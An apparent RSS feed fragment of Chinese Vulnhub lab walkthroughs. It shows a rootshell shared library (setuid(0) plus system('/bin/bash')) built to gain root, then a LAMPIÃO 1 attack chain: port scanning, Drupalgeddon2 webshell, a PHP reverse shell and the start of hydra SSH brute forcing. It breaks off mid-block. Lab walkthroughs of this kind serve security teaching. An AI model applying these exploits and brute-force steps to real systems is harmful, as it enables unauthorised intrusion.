&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#1e889b">#include&lt;/span> &lt;span style="color:#1e889b">&amp;lt;dlfcn.h&amp;gt;&lt;/span>&lt;span style="color:#1e889b">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#1e889b">#include&lt;/span> &lt;span style="color:#1e889b">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#1e889b">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#1e889b">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00688b;font-weight:bold">int&lt;/span> &lt;span style="color:#008b45">main&lt;/span>(&lt;span style="color:#00688b;font-weight:bold">int&lt;/span> argc, &lt;span style="color:#00688b;font-weight:bold">char&lt;/span> *argv[]){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00688b;font-weight:bold">void&lt;/span> *handle;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00688b;font-weight:bold">int&lt;/span> (*function)();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">if&lt;/span>(argc &amp;lt; &lt;span style="color:#b452cd">2&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">return&lt;/span> &lt;span style="color:#b452cd">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> handle = &lt;span style="color:#008b45">dlopen&lt;/span>(argv[&lt;span style="color:#b452cd">1&lt;/span>], RTLD_LAZY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> function = &lt;span style="color:#008b45">dlsym&lt;/span>(handle, &lt;span style="color:#cd5555">&amp;#34;test_this&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#008b45">function&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">return&lt;/span> &lt;span style="color:#b452cd">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>大概是执行后带文件主函数为&lt;code>test_this&lt;/code>&lt;/p>
&lt;p>找了一圈，参考&lt;/p>
&lt;pre tabindex="0">&lt;code>https://github.com/jivoi/pentest/blob/master/shell/rootshell.c
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#1e889b">#include&lt;/span> &lt;span style="color:#1e889b">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#1e889b">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#1e889b">#include&lt;/span> &lt;span style="color:#1e889b">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#1e889b">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#1e889b">#include&lt;/span> &lt;span style="color:#1e889b">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#1e889b">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#1e889b">&lt;/span>&lt;span style="color:#00688b;font-weight:bold">int&lt;/span> &lt;span style="color:#008b45">test_this&lt;/span>(&lt;span style="color:#00688b;font-weight:bold">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#008b45">setuid&lt;/span>(&lt;span style="color:#b452cd">0&lt;/span>); &lt;span style="color:#008b45">setgid&lt;/span>(&lt;span style="color:#b452cd">0&lt;/span>); &lt;span style="color:#008b45">system&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;/bin/bash&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>先在kali上编译&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gcc -fPIC -shared rootshell.c -o test_this
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在靶机上执行&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/374/13.webp" alt="13">&lt;/p>
&lt;p>成功获得root权限&lt;/p>- https://www.vulnhub.cn/walkthrough/374/ - This is a customized copyright.</description></item><item><title>Vulnhub 249 LAMPIÃO 1</title><link>https://www.vulnhub.cn/walkthrough/249/</link><pubDate>Sat, 28 Jul 2018 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/249/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/249/ -&lt;p>考点：drupal,hydra,暴力破解,dirtyc0w&lt;/p>
&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/&lt;/a>&lt;/p>
&lt;h2 id="环境配置">环境配置&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>名称&lt;/th>
&lt;th>IP&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Kali Linux&lt;/td>
&lt;td>10.0.2.15&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>LAMPIÃO&lt;/td>
&lt;td>10.0.2.9&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="初步打点">初步打点&lt;/h2>
&lt;h3 id="端口扫描">端口扫描&lt;/h3>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo arp-scan -l
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Starting arp-scan 1.9.7 with &lt;span style="color:#b452cd">256&lt;/span> hosts (https://github.com/royhills/arp-scan)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10.0.2.9 08:00:27:58:66:90 PCS Systemtechnik GmbH
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">tip&lt;/span>=10.0.2.9
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$tip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">1024&lt;/span> 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http?
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| fingerprint-strings:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| NULL:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| _____ _ _
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| |_|/ ___ ___ __ _ ___ _ _
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#cd5555">\x&lt;/span>20| __/ (_| __ &lt;span style="color:#cd5555">\x&lt;/span>20|_| |_
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ___/ __| |___/ ___|__,_|___/__, ( )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| |___/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ______ _ _ _
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ___(_) | | | |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#cd5555">\x&lt;/span>20/ _&lt;span style="color:#cd5555">`&lt;/span> | / _ / _&lt;span style="color:#cd5555">`&lt;/span> | | | |/ _&lt;span style="color:#cd5555">`&lt;/span> | |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ __,_|__,_|_| |_|
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1898/tcp open http Apache httpd 2.4.7 ((Ubuntu))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.7 (Ubuntu)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-robots.txt: &lt;span style="color:#b452cd">36&lt;/span> disallowed entries (&lt;span style="color:#b452cd">15&lt;/span> shown)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /includes/ /misc/ /modules/ /profiles/ /scripts/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_/LICENSE.txt /MAINTAINERS.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-generator: Drupal &lt;span style="color:#b452cd">7&lt;/span> (http://drupal.org)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Lampi&lt;span style="color:#cd5555">\x&lt;/span>C3&lt;span style="color:#cd5555">\x&lt;/span>A3o
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
&lt;p>看来要在80和1898端口突破&lt;/p>
&lt;p>80扫一下就挂了&lt;/p>
&lt;p>1898端口打开是个Web应用，页脚显示drupal&lt;/p>
&lt;p>使用&lt;code>whatweb&lt;/code>探测一下drupa版本&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ whatweb http://10.0.2.9:1898
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>http://10.0.2.9:1898 [&lt;span style="color:#b452cd">200&lt;/span> OK] Apache[2.4.7], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.0.2.9], JQuery, MetaGenerator[Drupal &lt;span style="color:#b452cd">7&lt;/span> (http://drupal.org)], PHP[5.5.9-1ubuntu4.24], PasswordField[pass], Script[text/javascript], Title[Lampião], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.5.9-1ubuntu4.24]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>大概率是Drupal 7&lt;/p>
&lt;h3 id="漏洞发现">漏洞发现&lt;/h3>
&lt;p>试试&lt;a href="https://github.com/dreadlocked/Drupalgeddon2">Drupalgeddon2&lt;/a>&lt;/p>
&lt;p>运行报错&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#cd5555">internal&lt;/span>:&lt;span style="color:#1c7e71">/usr/&lt;/span>lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb&amp;gt;:&lt;span style="color:#b452cd">85&lt;/span>&lt;span style="color:#cd5555">:in&lt;/span> &lt;span style="color:#cd5555">`require&amp;#39;: cannot load such file -- highline/import (LoadError)
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>google查询安装&lt;code>highline&lt;/code>即可&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo gem install highline
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>运行后显示&lt;code>drupalgeddon2.rb&lt;/code> 已写入webshell&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/249/1.webp" alt="1">&lt;/p>
&lt;h2 id="获得权限">获得权限&lt;/h2>
&lt;h3 id="靶机测试">靶机测试&lt;/h3>
&lt;h4 id="思路一-drupalgeddon2">思路一 Drupalgeddon2&lt;/h4>
&lt;p>通过&lt;a href="https://github.com/dreadlocked/Drupalgeddon2">Drupalgeddon2&lt;/a>获得的webshell执行&lt;code>id&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/249/2.webp" alt="2">&lt;/p>
&lt;p>下载php-reverse-shell.php 访问，获得反弹shell&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/249/3.webp" alt="3">&lt;/p>
&lt;h4 id="思路二-暴力破解">思路二 暴力破解&lt;/h4>
&lt;h5 id="用户名">用户名&lt;/h5>
&lt;p>查看两个内容页面，对应用户名是 &lt;code>tiago&lt;/code>和&lt;code>Eder&lt;/code>作为用户名字典&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cat user
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tiago
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eder
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h5 id="密码">密码&lt;/h5>
&lt;p>使用cewl获取个字典文件作为密码字典&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cewl -w 1.txt http://10.0.2.9:1898/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h5 id="hydra">hydra&lt;/h5>
&lt;p>使用&lt;a href="https://www.iihack.com/pages/tools/hydra.html">hydra&lt;/a>爆破ssh&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
